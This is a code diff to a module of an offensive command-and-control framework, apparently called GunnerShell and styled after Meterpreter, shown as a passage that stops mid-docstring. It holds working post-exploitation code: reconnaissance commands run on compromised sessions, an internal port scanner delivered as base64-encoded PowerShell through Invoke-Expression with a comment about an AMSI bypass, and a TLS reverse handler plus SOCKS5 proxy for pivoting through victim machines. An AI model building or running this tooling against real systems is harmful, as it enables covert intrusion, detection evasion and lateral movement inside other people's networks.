@@ -5,9 +5,13 @@ import subprocess
 import re
 import time
 import ipaddress
+import threading, socketserver, socket
 from core.session_handlers import session_manager
 from core import shell
+from core.listeners import tcp_listener
+import _thread
 import base64
+import queue
 from itertools import chain, cycle
 from colorama import Style, Fore
 
@@ -16,153 +20,154 @@ brightyellow = Style.BRIGHT + Fore.YELLOW
 brightred   = Style.BRIGHT + Fore.RED
 brightcyan  = Style.BRIGHT + Fore.CYAN
 reset = Style.RESET_ALL
+reverse_sock = None
 
 def netstat(sid, os_type):
-    """
-    Show network connections on the remote host, very similar to Meterpreter's 'netstat'.
+	"""
+	Show network connections on the remote host, very similar to Meterpreter's 'netstat'.
 
-    - sid:     the real session ID
-    - os_type: session.metadata.get("os") lower‐cased ("windows" vs. "linux")
+	- sid:     the real session ID
+	- os_type: session.metadata.get("os") lower‐cased ("windows" vs. "linux")
 
-    Returns the raw output of the appropriate netstat command.
-    """
-    # resolve display name
-    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+	Returns the raw output of the appropriate netstat command.
+	"""
+	# resolve display name
+	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 
-    # pick the right command
-    if "windows" in os_type:
-        # -a all, -n numeric, -o include PID
-        cmd = "Get-NetTCPConnection | Select-Object @{n='Proto';e={$_.Protocol}},@{n='Local';e={$_.LocalAddress+':'+$_.LocalPort}},@{n='Remote';e={$_.RemoteAddress+':'+$_.RemotePort}},State,@{n='PID';e={$_.OwningProcess}},@{n='Program';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} | Format-Table -AutoSize"
-    else:
-        # -t tcp, -u udp, -n numeric, -a all, -p show PID/program name, -e extra
-        cmd = "netstat -tunape"
+	# pick the right command
+	if "windows" in os_type:
+		# -a all, -n numeric, -o include PID
+		cmd = "Get-NetTCPConnection | Select-Object @{n='Proto';e={$_.Protocol}},@{n='Local';e={$_.LocalAddress+':'+$_.LocalPort}},@{n='Remote';e={$_.RemoteAddress+':'+$_.RemotePort}},State,@{n='PID';e={$_.OwningProcess}},@{n='Program';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} | Format-Table -AutoSize"
+	else:
+		# -t tcp, -u udp, -n numeric, -a all, -p show PID/program name, -e extra
+		cmd = "netstat -tunape"
 
-    # look up session
-    sess = session_manager.sessions.get(sid)
-    if not sess:
-        return brightred + f"[!] No such session: {display}"
+	# look up session
+	sess = session_manager.sessions.get(sid)
+	if not sess:
+		return brightred + f"[!] No such session: {display}"
 
-    # dispatch over HTTP(S) or TCP/TLS
-    transport = sess.transport.lower()
-    if transport in ("http", "https"):
-        out = shell.run_command_http(sid, cmd)
+	# dispatch over HTTP(S) or TCP/TLS
+	transport = sess.transport.lower()
+	if transport in ("http", "https"):
+		out = shell.run_command_http(sid, cmd)
 
-    else:
-        out = shell.run_command_tcp(sid, cmd, timeout=5)
+	else:
+		out = shell.run_command_tcp(sid, cmd, timeout=5, portscan_active=True)
 
-    # ensure we at least return an empty string
-    return out or None
+	# ensure we at least return an empty string
+	return out or None
 
 # stubs for the other Meterpreter-style cmds you mentioned
 def arp(sid, os_type):
-    """
-    Display the host ARP cache.
-    """
-    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
-    if "windows" in os_type:
-        cmd = "arp -a"
+	"""
+	Display the host ARP cache.
+	"""
+	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+	if "windows" in os_type:
+		cmd = "arp -a"
 
-    else:
-        cmd = "ip neigh show"
+	else:
+		cmd = "ip neigh show"
 
-    sess = session_manager.sessions.get(sid)
-    if not sess:
-        return brightred + f"[!] No such session: {display}"
+	sess = session_manager.sessions.get(sid)
+	if not sess:
+		return brightred + f"[!] No such session: {display}"
 
-    if sess.transport.lower() in ("http","https"):
-        return shell.run_command_http(sid, cmd) or None
+	if sess.transport.lower() in ("http","https"):
+		return shell.run_command_http(sid, cmd) or None
 
-    else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None
+	else:
+		return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
 
 def ipconfig(sid, os_type):
-    """
-    Display network interfaces on the remote host:
-      - Windows: ipconfig /all
-      - Linux/macOS: ifconfig -a
-    """
-    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+	"""
+	Display network interfaces on the remote host:
+	  - Windows: ipconfig /all
+	  - Linux/macOS: ifconfig -a
+	"""
+	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 
-    # pick command by OS
-    if "windows" in os_type:
-        cmd = "ipconfig /all"
-    else:
-        cmd = "ifconfig -a"
+	# pick command by OS
+	if "windows" in os_type:
+		cmd = "ipconfig /all"
+	else:
+		cmd = "ifconfig -a"
 
-    sess = session_manager.sessions.get(sid)
-    if not sess:
-        return brightred + f"[!] No such session: {display}"
+	sess = session_manager.sessions.get(sid)
+	if not sess:
+		return brightred + f"[!] No such session: {display}"
 
-    # dispatch over HTTP(S) or TCP/TLS, with a slightly longer timeout on Windows
-    if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
-    else:
-        timeout = 2.0 if "windows" in os_type else 0.5
-        return shell.run_command_tcp(sid, cmd, timeout=timeout) or None
+	# dispatch over HTTP(S) or TCP/TLS, with a slightly longer timeout on Windows
+	if sess.transport.lower() in ("http", "https"):
+		return shell.run_command_http(sid, cmd) or None
+	else:
+		timeout = 0.5 if "windows" in os_type else 0.5
+		return shell.run_command_tcp(sid, cmd, timeout=timeout, portscan_active=True) or None
 
 def resolve(sid, os_type, hostname):
-    """
-    Resolve a DNS name on the target.
-    """
-    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
-    if "windows" in os_type.lower():
-        cmd = f"nslookup {hostname}"
+	"""
+	Resolve a DNS name on the target.
+	"""
+	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+	if "windows" in os_type.lower():
+		cmd = f"nslookup {hostname}"
 
-    else:
-        cmd = f"getent hosts {hostname} || host {hostname}"
-    sess = session_manager.sessions.get(sid)
-    if not sess:
-        return brightred + f"[!] No such session: {display}"
+	else:
+		cmd = f"getent hosts {hostname} || host {hostname}"
+	sess = session_manager.sessions.get(sid)
+	if not sess:
+		return brightred + f"[!] No such session: {display}"
 
-    if sess.transport.lower() in ("http","https"):
-        return shell.run_command_http(sid, cmd) or None
+	if sess.transport.lower() in ("http","https"):
+		return shell.run_command_http(sid, cmd) or None
 
-    else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None
+	else:
+		return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
 
 def route(sid, os_type):
-    """
-    View the routing table.
-    """
-    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
-    if "windows" in os_type:
-        cmd = "route print"
+	"""
+	View the routing table.
+	"""
+	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+	if "windows" in os_type:
+		cmd = "route print"
 
-    else:
-        cmd = "ip route show"
-    sess = session_manager.sessions.get(sid)
-    if not sess:
-        return brightred + f"[!] No such session: {display}"
+	else:
+		cmd = "ip route show"
+	sess = session_manager.sessions.get(sid)
+	if not sess:
+		return brightred + f"[!] No such session: {display}"
 
-    if sess.transport.lower() in ("http","https"):
-        return shell.run_command_http(sid, cmd) or None
+	if sess.transport.lower() in ("http","https"):
+		return shell.run_command_http(sid, cmd) or None
 
-    else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5) or None
+	else:
+		return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
 
 def getproxy(sid, os_type):
-    """
-    Display the current proxy configuration on the remote host.
-    - Windows:  netsh winhttp show proxy
-    - Linux/macOS: print any HTTP(S)_PROXY vars
-    """
-    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+	"""
+	Display the current proxy configuration on the remote host.
+	- Windows:  netsh winhttp show proxy
+	- Linux/macOS: print any HTTP(S)_PROXY vars
+	"""
+	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 
-    if "windows" in os_type:
-        cmd = "netsh winhttp show proxy"
-    else:
-        # catch both lowercase and uppercase env vars
-        cmd = "env | grep -i proxy || echo No proxy vars set"
+	if "windows" in os_type:
+		cmd = "netsh winhttp show proxy"
+	else:
+		# catch both lowercase and uppercase env vars
+		cmd = "env | grep -i proxy || echo No proxy vars set"
 
-    sess = session_manager.sessions.get(sid)
-    if not sess:
-        return brightred + f"[!] No such session: {display}"
+	sess = session_manager.sessions.get(sid)
+	if not sess:
+		return brightred + f"[!] No such session: {display}"
 
-    if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
-    else:
-        # give a bit longer in case env takes a moment
-        return shell.run_command_tcp(sid, cmd, timeout=1) or None
+	if sess.transport.lower() in ("http", "https"):
+		return shell.run_command_http(sid, cmd) or None
+	else:
+		# give a bit longer in case env takes a moment
+		return shell.run_command_tcp(sid, cmd, timeout=1, portscan_active=True) or None
 
 
 COMMON_PORTS_ps1 = """@"
@@ -211,25 +216,25 @@ COMMON_PORTS_ps1 = """@"
 "@"""
 
 def chunked(iterable, size):
-    for i in range(0, len(iterable), size):
-        yield iterable[i:i+size]
+	for i in range(0, len(iterable), size):
+		yield iterable[i:i+size]
 
 def expand_ports(port_spec_str):
-    # remove the @", "@ wrapper and split on commas
-    spec = port_spec_str.strip('@"\n')
-    if spec == "-":
-        return list(range(1, 65_536))
-        
-    parts = spec.split(',')
-    ports = []
-    for p in parts:
-        p = p.strip()
-        if '-' in p:
-            a, b = map(int, p.split('-'))
-            ports.extend(range(a, b+1))
-        elif p:
-            ports.append(int(p))
-    return ports
+	# remove the @", "@ wrapper and split on commas
+	spec = port_spec_str.strip('@"\n')
+	if spec == "-":
+		return list(range(1, 65_536))
+		
+	parts = spec.split(',')
+	ports = []
+	for p in parts:
+		p = p.strip()
+		if '-' in p:
+			a, b = map(int, p.split('-'))
+			ports.extend(range(a, b+1))
+		elif p:
+			ports.append(int(p))
+	return ports
 
 ALL_PORTS = expand_ports(COMMON_PORTS_ps1)
 BATCH_SIZE = 50
@@ -237,237 +242,686 @@ PORT_BATCHES = list(chunked(ALL_PORTS, BATCH_SIZE))
 spinner = cycle(["|", "/", "-", "\\"])
 
 def check_target_arp(sid, runner, gw, target):
-    # one-time PS to prime gateway ARP and look for the target’s MAC
-    ps = f"""
+	sess    = session_manager.sessions.get(sid)
+	transport = getattr(sess, "transport", None).lower()
+	# one-time PS to prime gateway ARP and look for the target’s MAC
+	ps = f"""
 ping -n 1 -w 500 {gw} | Out-Null
 $t = arp -a | Select-String "{target}\\s+([0-9A-Fa-f]{{2}}-){{5}}[0-9A-Fa-f]{{2}}"
 if ($t) {{ Write-Output "ARP_OK" }}"""
 
-    b64_check = base64.b64encode(ps.encode('utf-16le')).decode()
+	b64_check = base64.b64encode(ps.encode('utf-16le')).decode()
 
-                
-    check_cmd = (
-        "$ps = [System.Text.Encoding]::Unicode"
-        f".GetString([Convert]::FromBase64String(\"{b64_check}\")); "
-        "Invoke-Expression $ps"
-        )
+			
+	check_cmd = (
+		"$ps = [System.Text.Encoding]::Unicode"
+		f".GetString([Convert]::FromBase64String(\"{b64_check}\")); "
+		"Invoke-Expression $ps"
+		)
 
-    out = runner(sid, check_cmd, timeout=1, portscan_active=True) or ""
-    if "ARP_OK" in out:
-        return "OK"
+	if transport in ("tcp", "tls"):
+		out = shell.run_command_tcp(sid, check_cmd, timeout=1, portscan_active=True)
 
-    else:
-        return "NO"
+	elif transport in ("http", "https"):
+		out = shell.run_command_http(sid, check_cmd)
+
+	else:
+		print(brightred + f"[!] Unknown transport!")
+	
+	if "ARP_OK" in out:
+		return "OK"
+
+	else:
+		return "NO"
 
 
 def portscan(sid, os_type, target, skip_ping=False, port_spec=None):
-    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
-    sess    = session_manager.sessions.get(sid)
-    if not sess:
-        return brightred + f"[!] No such session: {display}"
+	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+	sess    = session_manager.sessions.get(sid)
 
-    DYNAMIC_LINES = 2
-    ESC = "\x1b["
+	if not sess:
+		return brightred + f"[!] No such session: {display}"
 
-    runner = shell.run_command_http if sess.transport.lower() in ("http","https") else shell.run_command_tcp
+	transport = getattr(sess, "transport", None).lower()
+	DYNAMIC_LINES = 2
+	ESC = "\x1b["
 
-    # Windows branch: inline AMSI-bypass + PS function + invocation
-    if "windows" in os_type:
-        if "/" in target:
-            # parse the CIDR, non-strict so .0/24 or .255/32 etc. are OK
-            net = ipaddress.ip_network(target, strict=False)
+	runner = shell.run_command_http if sess.transport.lower() in ("http","https") else shell.run_command_tcp
 
-            # for a /32, ip_network.hosts() is empty, so we special-case it
-            if net.num_addresses == 1:
-                hosts = [str(net.network_address)]
-            else:
-                # .hosts() skips network & broadcast; yields all usable
-                hosts = [str(h) for h in net.hosts()]
+	# Windows branch: inline AMSI-bypass + PS function + invocation
+	if "windows" in os_type:
+		if "/" in target:
+			# parse the CIDR, non-strict so .0/24 or .255/32 etc. are OK
+			net = ipaddress.ip_network(target, strict=False)
 
-        else:
-            # single-IP case
-            hosts = [target]
+			# for a /32, ip_network.hosts() is empty, so we special-case it
+			if net.num_addresses == 1:
+				hosts = [str(net.network_address)]
+			else:
+				# .hosts() skips network & broadcast; yields all usable
+				hosts = [str(h) for h in net.hosts()]
 
-        # 2) optional ping filter
-        if not skip_ping:
-            alive = []
-            for ip in hosts:
-                check_cmd = f"Test-Connection -Quiet -Count 1 -ComputerName {ip}"
-                b64_check = base64.b64encode(check_cmd.encode('utf-16le')).decode()
+		else:
+			# single-IP case
+			hosts = [target]
 
-                
-                check_cmd = (
-                    "$ps = [System.Text.Encoding]::Unicode"
-                    f".GetString([Convert]::FromBase64String(\"{b64_check}\")); "
-                    "Invoke-Expression $ps"
-                    )
-                pong = runner(sid, check_cmd,timeout=2, portscan_active=True)
-                if pong and pong.strip().lower() == "true":
-                    alive.append(ip)
-            hosts = alive
+		# 2) optional ping filter
+		if not skip_ping:
+			alive = []
+			for ip in hosts:
+				check_cmd = f"Test-Connection -Quiet -Count 1 -ComputerName {ip}"
+				b64_check = base64.b64encode(check_cmd.encode('utf-16le')).decode()
 
-        results = {}
-        total_hosts = len(hosts)
-        gw_cmd = "(Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway.NextHop } | Select-Object -First 1 -ExpandProperty IPv4DefaultGateway).NextHop"
-        b64_gw = base64.b64encode(gw_cmd.encode('utf-16le')).decode()
+				
+				check_cmd = (
+					"$ps = [System.Text.Encoding]::Unicode"
+					f".GetString([Convert]::FromBase64String(\"{b64_check}\")); "
+					"Invoke-Expression $ps"
+					)
+				if transport in ("tcp", "tls"):
+					pong = shell.run_command_tcp(sid, check_cmd, timeout=2, portscan_active=True)
 
-        # one-liner to decode & invoke
-        gw_cmd = (
-            "$ps = [System.Text.Encoding]::Unicode"
-            f".GetString([Convert]::FromBase64String(\"{b64_gw}\")); "
-            "Invoke-Expression $ps"
-            )
+				elif transport in ("http", "https"):
+					pong = shell.run_command_http(sid, check_cmd)
 
-        gw = runner(sid, gw_cmd,timeout=0.5, portscan_active=True)
+				else:
+					print(brightred + f"[!] Unknown transport!")
+
+				if pong and pong.strip().lower() == "true":
+					alive.append(ip)
+			hosts = alive
+
+		results = {}
+		total_hosts = len(hosts)
+		gw_cmd = "(Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway.NextHop } | Select-Object -First 1 -ExpandProperty IPv4DefaultGateway).NextHop"
+		b64_gw = base64.b64encode(gw_cmd.encode('utf-16le')).decode()
+
+		# one-liner to decode & invoke
+		gw_cmd = (
+			"$ps = [System.Text.Encoding]::Unicode"
+			f".GetString([Convert]::FromBase64String(\"{b64_gw}\")); "
+			"Invoke-Expression $ps"
+			)
+
+		if transport in ("http", "https"):
+			gw = shell.run_command_http(sid, gw_cmd)
+
+		elif transport in ("tcp", "tls"):
+			gw = shell.run_command_tcp(sid, gw_cmd, timeout=0.5, portscan_active=True)
+		
+		else:
+			print(brightred + f"[!] Unknown transport!")
 
 
-        for ip in hosts[:]:
-            sys.stdout.write(brightyellow + f"\rDiscovering Hosts [{next(spinner)}]")
-            sys.stdout.flush()
+		for ip in hosts[:]:
+			sys.stdout.write(brightyellow + f"\rDiscovering Hosts [{next(spinner)}]")
+			sys.stdout.flush()
 
-            arp_ok = False
+			arp_ok = False
 
-            arp_out = check_target_arp(sid, runner, gw, ip)
-            if "OK" in arp_out:
-                arp_ok = True
+			arp_out = check_target_arp(sid, runner, gw, ip)
+			if "OK" in arp_out:
+				arp_ok = True
 
-            else:
-                skip_ip = True
-                hosts.remove(ip)
-                continue
+			else:
+				skip_ip = True
+				hosts.remove(ip)
+				continue
 
-            # clear that whole line
-            sys.stdout.write("\r" + " " * 80 + "\r")
-            sys.stdout.flush()
+			# clear that whole line
+			sys.stdout.write("\r" + " " * 80 + "\r")
+			sys.stdout.flush()
 
-            if not arp_ok:
-                # skip this host
-                continue
+			if not arp_ok:
+				# skip this host
+				continue
 
-            ports   = []
-            batches = PORT_BATCHES
-            results[ip] = []
+			ports   = []
+			batches = PORT_BATCHES
+			results[ip] = []
 
-            if port_spec:
-                # this uses your existing helper to expand "80,443,1000-1100"
-                custom_ports = expand_ports(port_spec)
-                # rebuild batches
-                batches = list(chunked(custom_ports, BATCH_SIZE))
+			if port_spec:
+				# this uses your existing helper to expand "80,443,1000-1100"
+				custom_ports = expand_ports(port_spec)
+				# rebuild batches
+				batches = list(chunked(custom_ports, BATCH_SIZE))
 
-            elif port_spec == "-":
-                custom_ports = list(range(1, 65536))
-                batches = list(chunked(custom_ports, BATCH_SIZE))
+			elif port_spec == "-":
+				custom_ports = list(range(1, 65536))
+				batches = list(chunked(custom_ports, BATCH_SIZE))
 
-            else:
-                batches = PORT_BATCHES  # your precomputed common-1000 list
+			else:
+				batches = PORT_BATCHES  # your precomputed common-1000 list
 
-            nbatch  = len(batches)
+			nbatch  = len(batches)
 
-            for bidx, batch in enumerate(batches, start=1):
-                # build a comma list of just these 50 ports
-                ports_csv = ",".join(map(str, batch))
-                ps_func = f"""
+			for bidx, batch in enumerate(batches, start=1):
+				# build a comma list of just these 50 ports
+				ports_csv = ",".join(map(str, batch))
+				ps_func = f"""
 $Target   = '{ip}'
 $TimeoutMs = 100
 
-# ─── find default gateway ──────────────────────────────────────
 $gw = (Get-NetIPConfiguration |
-       Where-Object {{ $_.IPv4DefaultGateway.NextHop }} |
-       Select-Object -First 1 -ExpandProperty IPv4DefaultGateway).NextHop
+	   Where-Object {{ $_.IPv4DefaultGateway.NextHop }} |
+	   Select-Object -First 1 -ExpandProperty IPv4DefaultGateway).NextHop
 
 if (-not $gw) {{
-    Write-Output "SKIPPING $Target (no default gateway found)"
+	Write-Output "SKIPPING $Target (no default gateway found)"
 }} else {{
 
-    # ─── prime & check gateway ARP ───────────────────────────────
-    ping -n 1 -w 500 $gw | Out-Null
-    $gwMatch = arp -a |
-               Select-String "$gw\\s+([0-9A-Fa-f]{{2}}-){{5}}[0-9A-Fa-f]{{2}}" |
-               Select-Object -First 1
+	ping -n 1 -w 500 $gw | Out-Null
+	$gwMatch = arp -a |
+			   Select-String "$gw\\s+([0-9A-Fa-f]{{2}}-){{5}}[0-9A-Fa-f]{{2}}" |
+			   Select-Object -First 1
 
-    if ($gwMatch) {{
-        $gwEntry = $gwMatch.Line.Trim()
-    }}
+	if ($gwMatch) {{
+		$gwEntry = $gwMatch.Line.Trim()
+	}}
 
-    if ($gwEntry) {{
-        # ─── gateway is up, do the port scan ────────────────────
-        $ports = @({ports_csv})
-        foreach ($port in $ports) {{
-            Write-Output "TESTING port $port"
-            Write-Host   "TESTING port $port"
-            $tcp   = New-Object System.Net.Sockets.TcpClient
-            $async = $tcp.BeginConnect($Target, $port, $null, $null)
-            if ($async.AsyncWaitHandle.WaitOne($TimeoutMs)) {{
-                try {{
-                    $tcp.EndConnect($async)
-                    Write-Output "PORT $port OPEN"
-                    Write-Host   "PORT $port OPEN"
-                }} catch {{}}
-            }}
-            $tcp.Close()
-        }}
-    }} else {{
-        Write-Output "SKIPPING $Target (gateway $gw did not answer ARP)"
-    }}
+	if ($gwEntry) {{
+		$ports = @({ports_csv})
+		foreach ($port in $ports) {{
+			Write-Output "TESTING port $port"
+			$tcp   = New-Object System.Net.Sockets.TcpClient
+			$async = $tcp.BeginConnect($Target, $port, $null, $null)
+			if ($async.AsyncWaitHandle.WaitOne($TimeoutMs)) {{
+				try {{
+					$tcp.EndConnect($async)
+					Write-Output "PORT $port OPEN"
+					Write-Host   "PORT $port OPEN"
+				}} catch {{}}
+			}}
+			$tcp.Close()
+		}}
+	}} else {{
+		Write-Output "SKIPPING $Target (gateway $gw did not answer ARP)"
+	}}
 }}
 """     
 
-                # UTF-16LE + Base64 encode
-                b64 = base64.b64encode(ps_func.encode('utf-16le')).decode()
+				# UTF-16LE + Base64 encode
+				b64 = base64.b64encode(ps_func.encode('utf-16le')).decode()
 
-                # one-liner to decode & invoke
-                ps_cmd = (
-                    "$ps = [System.Text.Encoding]::Unicode"
-                    f".GetString([Convert]::FromBase64String(\"{b64}\")); "
-                    "Invoke-Expression $ps"
-                )
+				# one-liner to decode & invoke
+				ps_cmd = (
+					"$ps = [System.Text.Encoding]::Unicode"
+					f".GetString([Convert]::FromBase64String(\"{b64}\")); "
+					"Invoke-Expression $ps"
+				)
 
-                out = runner(sid, ps_cmd, timeout=0.2, portscan_active=True)
+				if transport in ("tcp", "tls"):
+					out = shell.run_command_tcp(sid, ps_cmd, timeout=0.2, portscan_active=True)
 
-                # parse ports
-                if out and "SKIPPING" not in out and "skipping" not in out:
-                    for raw in out.splitlines():
-                        line = raw.strip()
-                        m = re.search(r'PORT\s+(\d+)\s+OPEN', line)
+				elif transport in ("http", "https"):
+					out = shell.run_command_http(sid, ps_cmd)
 
-                        if m != None:
-                            ports.append(int(m.group(1)))
-                            #results[ip] = ports
+				else:
+					print(brightred + f"[!] Unknown transport!")
 
-                pct = int(bidx * 100 / nbatch)
-                barlen = 20
-                filled = int(barlen * pct / 100)
-                bar = "#" * filled + "-" * (barlen - filled)
-                sys.stdout.write(brightyellow + f"\rScanning [{bar}] {pct:3d}% {bidx}/{nbatch} ⟶ {ip}")
-                sys.stdout.flush()
+				# parse ports
+				if out and "SKIPPING" not in out and "skipping" not in out:
+					for raw in out.splitlines():
+						line = raw.strip()
+						m = re.search(r'PORT\s+(\d+)\s+OPEN', line)
 
-            #sys.stdout.write("\n")
-            sys.stdout.write("\r" + " " * 80 + "\r")
-            sys.stdout.flush()
-            results[ip] = sorted(set(ports))
+						if m != None:
+							ports.append(int(m.group(1)))
+							#results[ip] = ports
 
-        for _ in range(DYNAMIC_LINES):
-            # move cursor up one line
-            sys.stdout.write(f"{ESC}1A")
-            # erase entire line
-            sys.stdout.write(f"{ESC}2K")
+				pct = int(bidx * 100 / nbatch)
+				barlen = 20
+				filled = int(barlen * pct / 100)
+				bar = "#" * filled + "-" * (barlen - filled)
+				sys.stdout.write(brightyellow + f"\rScanning [{bar}] {pct:3d}% {bidx}/{nbatch} ⟶ {ip}")
+				sys.stdout.flush()
 
-        sys.stdout.flush()
+			#sys.stdout.write("\n")
+			sys.stdout.write("\r" + " " * 80 + "\r")
+			sys.stdout.flush()
+			results[ip] = sorted(set(ports))
 
-        output = []
-        for host, ports in results.items():
-            if not ports:
-                continue
+		for _ in range(DYNAMIC_LINES):
+			# move cursor up one line
+			sys.stdout.write(f"{ESC}1A")
+			# erase entire line
+			sys.stdout.write(f"{ESC}2K")
 
-            port_str = " ".join(f"{brightgreen}[{p}]{reset}" for p in ports)
-            output.append(f"{brightcyan}→{reset} {host}: {port_str}")
+		sys.stdout.flush()
 
-        # return all of them at once
-        if output:
-            return "\n".join(output) or brightyellow + "[*] No open ports found."
+		output = []
+		for host, ports in results.items():
+			if not ports:
+				continue
 
-    else:
-        # UNIX: use nmap as before
-        ping_flag = "-Pn" if skip_ping else ""
-        cmd = f"nmap {ping_flag} -p {COMMON_PORTS} {target}"
-        return runner(sid, cmd, timeout=60) or brightyellow + "[*] No output or scan failed."
+			port_str = " ".join(f"{brightgreen}[{p}]{reset}" for p in ports)
+			output.append(f"{brightcyan}→{reset} {host}: {port_str}")
+
+		# return all of them at once
+		if output:
+			return "\n".join(output) or brightyellow + "[*] No open ports found."
+
+	else:
+		# UNIX: use nmap as before
+		ping_flag = "-Pn" if skip_ping else ""
+		cmd = f"nmap {ping_flag} -p {COMMON_PORTS} {target}"
+		return runner(sid, cmd, timeout=60) or brightyellow + "[*] No output or scan failed."
+
+
+ssl_lock = threading.Lock()
+
+def handlerServer(q, handler_port, context):
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	sock.bind(("0.0.0.0", handler_port))
+	sock.listen(5)
+	#print(brightgreen + f"[+] Reverse handler listening on 0.0.0.0:{handler_port}")
+	while True:
+		client, addr = sock.accept()
+		#print(brightgreen + f"[*] Revere Socks connection from agent {addr}")
+		try:
+			ssl_sock = context.wrap_socket(client, server_side=True, do_handshake_on_connect=False)
+
+			with ssl_lock:
+				ssl_sock.do_handshake()
+
+		except Exception as e:
+			print(brightred + f"[-] Handshake failed from {addr}: {e}")
+			client.close()
+			continue
+
+		#print(brightgreen + f"[+] Reverse connection from {addr}")
+		data = b""
+		while data.count(b"\n") < 3:
+			with ssl_lock:
+				chunk = ssl_sock.recv(1024)
+
+			if not chunk:
+				break
+			data += chunk
+
+		"""if data:
+			print(f"HANDLER SERVER RECEIVED: {data}")"""
+
+		with ssl_lock:
+			ssl_sock.send(b"HTTP/1.1 200 OK\nContent-Length: 999999\nContent-Type: text/plain\nConnection: Keep-Alive\nKeep-Alive: timeout=20, max=10000\n\n")
+
+
+		with ssl_lock:
+			ssl_sock.send(b"HELLO")
+
+		while not q.empty():
+			try:
+				old = q.get_nowait()
+				"""try:
+					old.close()
+
+				except Exception as e:
+					#print(f"HIT EXCEPTION BLOCK WHEN CLOSING OLD VAR SOCKET: {e}")
+					pass"""
+
+			except Exception as e:
+				#print(f"HIT EXCEPTION BLOCK WHEN GETTING Q OLD WITH NO WAIT: {e}")
+				break
+
+		q.put(ssl_sock)
+		#print(f"[DEBUG] queued ssl_sock; queue size={q.qsize()}")
+
+def forward(src, dst, close_src=False, close_dst=False):
+	global reverse_sock
+	#print("IN FORWARD FUNCTION!")
+	try:
+		while True:
+			data = src.recv(4096)
+			if not data:
+				#print("NO DATA")
+				break
+
+			"""if data:
+				print(f"DATA HIT FORWARD FUNCTION: {data}")"""
+
+			with ssl_lock:
+				dst.sendall(data)
+
+	except Exception as e:
+		#print(f"HIT EXCEPTION IN FORWARD FUNCTION: {e}")
+		pass
+
+	finally:
+		try:
+			src.close()
+
+		except Exception as e:
+			#rint(f"HIT EXCEPTION CLOSING SRC SOCKET: {e}")
+			pass
+
+		#print("SETTING REVERSE SOCK TO NONE")
+		reverse_sock = None
+
+		if close_dst:
+			try:
+				dst.close()
+
+			except Exception as e:
+				#print(f"HIT EXCEPTION CLOSING DST SOCKET: {e}")
+				pass
+
+def handle_socks_client(client, agent_sock):
+	# set TCP_NODELAY on both ends
+	client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+	agent_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+	# spawn the two directions
+	t1 = threading.Thread(target=forward, args=(client, agent_sock))
+	t2 = threading.Thread(target=forward, args=(agent_sock, client))
+	t1.start()
+	t2.start()
+	# wait for both to finish before closing
+	t1.join()
+	t2.join()
+
+	client.close()
+	agent_sock.close()
+
+def server(proxy_port, handler_port):
+	# generate TLS context using your existing function
+	context = tcp_listener.generate_tls_context("0.0.0.0")
+	q = queue.Queue()
+
+	# start reverse handler
+	_thread.start_new_thread(handlerServer, (q, handler_port, context))
+
+	# start local SOCKS5 proxy
+	server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	server_sock.bind(("127.0.0.1", proxy_port))
+	server_sock.listen(5)
+	#print(brightgreen + f"[+] SOCKS5 proxy listening on 127.0.0.1:{proxy_port}")
+
+	while True:
+		client, addr = server_sock.accept()
+
+		try:
+			# get a *fresh* agent socket for _this_ client
+			agent = q.get(timeout=10)
+		except queue.Empty:
+			#print("QUEUE EMPTY CLOSING CLIENT")
+			client.close()
+			continue
+
+		# hand off to per‐connection handler
+		threading.Thread(
+			target=handle_socks_client,
+			args=(client, agent),
+			daemon=True
+		).start()
+
+	"""while True:
+		client, addr = server_sock.accept()
+		#print(brightgreen + f"[+] SOCKS client from {addr}")
+		remote = getActiveConnection(q)
+		if not remote:
+			#print("NO ACTIVE CONNECTION, CLOSING CLIENT!!")
+			client.close()
+			continue
+
+		try:
+			client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+		except Exception as e:
+			print(brightred + f"[!] Hit an error while modifying sockets")
+
+		threading.Thread(target=forward, args=(client, remote), kwargs={"close_src":True, "close_dst":False}, daemon=True).start()
+		threading.Thread(target=forward, args=(remote, client), kwargs={"close_src":False, "close_dst":True}, daemon=True).start()"""
+
+
+# --- GunnerShell command ---
+def socks_proxy(sid, local_host, socks_port, local_port):
+	"""
+	Spins up reverse SOCKS:
+	  1) TLS handler on handler_port (self-signed)
